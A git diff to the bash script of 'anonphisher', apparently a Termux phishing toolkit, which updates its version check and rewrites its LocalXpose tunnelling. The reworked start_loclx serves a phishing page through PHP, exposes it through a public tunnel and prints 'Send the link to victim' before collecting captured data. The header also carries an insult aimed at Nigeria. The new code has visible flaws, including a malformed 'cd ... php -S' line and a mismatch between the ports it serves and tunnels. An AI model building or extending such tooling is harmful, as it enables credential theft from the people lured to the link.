@@ -1,7 +1,7 @@
 #!/bin/bash
 #Author: AnonyminHack5
 #Credits to: Akshay  &  TAHMID RAYAT 
-#Version: 3.2 updated
+#Version: 3.3.1 updated
 #Do not copy script without authors' consent it is illegal and makes you as stupid as Nigeria or as stupid as the p in psychology
 #Facebook: https://facebook.com/AnonyminHack5
 
@@ -43,7 +43,19 @@ UPurple='\033[4;35m'      # Purple
 UCyan='\033[4;36m'        # Cyan
 UWhite='\033[4;37m'       # White
 
-__version__="3.3"
+__version__="3.3.1"
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080'
+
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
 
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
 
@@ -55,33 +67,23 @@ reset_color() {
 }
 
 check_update() {
-    echo -ne "\n${Green}[${White}+${Green}]${Cyan} Checking for update : "
-	release_url='https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest'
-	new_version=$(curl -s "${release_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/TermuxHackz/anonphisher/archive/refs/tags/${new_version}.tar.gz"
-
-	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${Orange}update found\n"${White}
-		sleep 2
-		echo -ne "\n${Green}[${White}+${Green}]${Orange} Downloading Update..."
-		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".anonphisher.tar.gz" "${tarball_url}"
-
-		if [[ -e ".anonphisher.tar.gz" ]]; then
-			tar -xf .anonphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${Red}[${White}!${Red}]${Red} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .anonphisher.tar.gz
-			popd > /dev/null 2>&1
-			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${Green}[${White}+${Green}] Successfully updated! Run anonphisher again\n\n"${White}
-			{ reset_color ; exit 1; }
+    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	latest_version=$(curl -s "https://api.github.com/repos/TermuxHackz/anonphisher/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
+	if [[ $latest_version != "" ]]; then
+		if [[ $latest_version != $__version__ ]]; then
+			echo -e "${GREEN}New version available : ${ORANGE}$latest_version${WHITE}"
+			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Updating to latest version..."
+			git pull
+			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Update successful."
+			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Restarting tool..."
+			bash setup
+			exit 0
 		else
-			echo -e "\n${Red}[${White}!${Red}]${Red} Error occured while downloading."
-			{ reset_color; exit 1; }
+			echo -e "${GREEN}No update available."
+			sleep 1
 		fi
 	else
-		echo -ne "${Green}up to date\n${White}" ; sleep .5
+		echo -e "${RED}Failed to check for update."
 	fi
 
 }
@@ -193,6 +195,10 @@ RESETBG="$(printf '\e[0m\n')"
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
 if [[ -d ".server/www" ]]; then
 	rm -rf ".server/www"
 	mkdir -p ".server/www"
@@ -1211,47 +1217,55 @@ else
 fi
 }
 
+localxpose_auth() {
+	./.termuxhackz/loclx -help >/dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
+
+	[ "$(./.termuxhackz/loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token."
+			sleep 2
+			tunnel_menu
+		} || {
+			echo -n "$loclx_token" >$auth_f 2>/dev/null
+		}
+	}
+}
+
 start_loclx() {
 
-loclx_default_choose_sub="Y"
-loclx_default_sub="$website$RANDOM"
+echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{
+		sleep 1
+		cd .termuxhackz/www php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+		localxpose_auth
+	}
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
-printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
-read loclx_choose_sub
-loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
-if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
-loclx_custom_subdomain=true
-sleep 1
-printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
-read loclx_subdomain
-loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
-sleep 1
-fi
+	if [[ $(command -v termux-chroot) ]]; then
+		sleep 1 && termux-chroot ./.termuxhackz/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.termuxhackz/.loclx 2>&1 &
+	else
+		sleep 1 && ./.termuxhackz/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" >.termuxhackz/.loclx 2>&1 &
+	fi
 
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
-cd .termuxhackz/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
-if [[ $loclx_custom_subdomain == true ]]; then
-
-./.termuxhackz/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &
-
-sleep 5
-
+	sleep 12
+	loclx_url=$(cat .termuxhackz/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+    if [ -z "$loclx_url" ]; then
+    echo -e "\n${RED}[${WHITE}-${RED}]${RED} Failed to create a link to send.\e[0m\n"
+    exit 1
 else
-./.termuxhackz/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
-sleep 5
-fi
-loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
-smallbanner
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $loclx_link
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $loclx_url
 
-datafound
+    datafound
+fi
+
 }
 
 start_localhostrun() {
